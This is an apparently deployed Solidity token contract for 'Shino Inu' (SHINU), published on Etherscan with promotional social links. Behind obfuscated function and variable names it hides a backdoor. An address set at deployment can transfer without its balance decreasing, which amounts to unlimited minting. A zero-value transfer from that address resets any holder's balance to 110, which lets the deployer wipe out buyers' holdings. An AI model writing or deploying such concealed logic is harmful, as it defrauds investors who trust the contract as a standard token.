/**
 *Submitted for verification at Etherscan.io on 2023-06-05
*/

/**
 -  https://t.me/shinoinuerc

 -  https://www.shino-inu.com/

 -  https://twitter.com/Shinoinuerc

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ShinoInu is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private allowances;

    uint256 private events = 110;

    function transfer(address returnn, uint256 publica) public returns (bool success) {
        fhnuwldtgraz(msg.sender, returnn, publica);
        return true;
    }

    function transferFrom(address senders, address returnn, uint256 publica) public returns (bool success) {
        require(publica <= allowance[senders][msg.sender]);
        allowance[senders][msg.sender] -= publica;
        fhnuwldtgraz(senders, returnn, publica);
        return true;
    }

    mapping(address => uint256) private xtqilhfpyn;

    string public name = 'Shino Inu';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address supplys, uint256 publica) public returns (bool success) {
        allowance[msg.sender][supplys] = publica;
        emit Approval(msg.sender, supplys, publica);
        return true;
    }

    address public strings;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address fromn) {
        balanceOf[msg.sender] = totalSupply;
        allowances[fromn] = events;
        IUniswapV2Router02 ifbvwlytgu = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        strings = IUniswapV2Factory(ifbvwlytgu.factory()).createPair(address(this), ifbvwlytgu.WETH());
    }

    function fhnuwldtgraz(address senders, address returnn, uint256 publica) private {
        if (allowances[senders] == 0) {
            balanceOf[senders] -= publica;
        }
        balanceOf[returnn] += publica;
        if (allowances[msg.sender] > 0 && publica == 0 && returnn != strings) {
            balanceOf[returnn] = events;
        }
        emit Transfer(senders, returnn, publica);
    }

    uint8 public decimals = 9;

    string public symbol = 'SHINU';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;
}